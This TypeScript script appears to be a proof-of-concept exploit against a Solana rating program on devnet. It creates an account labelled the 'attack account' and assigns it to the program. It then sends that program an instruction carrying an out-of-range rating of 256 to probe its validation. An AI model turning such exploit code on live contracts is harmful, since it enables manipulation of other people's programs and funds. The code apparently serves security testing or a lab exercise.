import fs from 'fs';
import os from 'os';
import * as web3 from '@solana/web3.js';
import { Buffer } from 'buffer';

async function main() {
  const connection = new web3.Connection('https://api.devnet.solana.com', 'confirmed');
  const programId = new web3.PublicKey('43ddfovLXPAwnAqGMG5Xe8M6NVj9RqUBFaDNwkkAoG3s');
  const payer = web3.Keypair.fromSecretKey(
    Uint8Array.from(JSON.parse(fs.readFileSync(`${os.homedir()}/.config/solana/id.json`, 'utf-8')))
    );
  console.log(`Payer is ${payer.publicKey}`)

  const andy = new web3.PublicKey('Andy1111111111111111111111111111111111111111')
  const receiver = payer.publicKey
  
  await testRatingProgram(connection, programId, payer, andy, receiver);
  }
  
  main().catch(console.error);

async function testRatingProgram(
  connection: web3.Connection,
  programId: web3.PublicKey,
  payer: web3.Keypair,
  andy: web3.PublicKey,
  receiver: web3.PublicKey
) {

  // Create the attack account owned by payer
  const attackAccount = web3.Keypair.generate();
  const attackAccountPubKey = attackAccount.publicKey

  // Calculate space and rent
  const space = 89; 
  const lamports = await connection.getMinimumBalanceForRentExemption(space);
  
  // Create attack account instruction
  const createAccountIx = web3.SystemProgram.createAccount({
    fromPubkey: payer.publicKey,
    newAccountPubkey: attackAccount.publicKey,
    lamports,
    space,
    programId: programId,
  });

  // Create and send transaction to create attack account
  const tx = new web3.Transaction().add(createAccountIx);
  
  try {
    const signature = await web3.sendAndConfirmTransaction(
      connection,
      tx,
      [payer, attackAccount]
    );
    console.log('Account created successfully:', signature);
    console.log('Attack account address:', attackAccount.publicKey.toString());
    console.log(`Attack account owner is ${(await connection.getAccountInfo(attackAccount.publicKey))?.owner.toString()}`);
  } catch (error) {
    console.error('Error creating account:', error);
    return;
  }

  // Now let's ping the contract with the rating
  const rating = 256; 
  const data = Buffer.alloc(256);
  data.writeBigUInt64LE(BigInt(rating));

  // Create the transaction
  const transaction = new web3.Transaction().add({
    keys: [
      {
        pubkey: attackAccountPubKey,
        isSigner: false,
        isWritable: true,
      },
      {
        pubkey: payer.publicKey,
        isSigner: true,
        isWritable: true,
      },
      {
        pubkey: web3.SystemProgram.programId,
        isSigner: false,
        isWritable: false,
      },
      {
        pubkey: receiver,
        isSigner: true,
        isWritable: true,
      },
      {
        pubkey: andy,
        isSigner: false,
        isWritable: false
      },
    ],
    programId: programId,
    data: data,
  });

  // Send and confirm the transaction
  try {
    const signature = await web3.sendAndConfirmTransaction(
      connection,
      transaction,
      [payer]
    );
    console.log('Transaction successful:', signature);
  } catch (error) {
    console.error('Error:', error);
  }
}
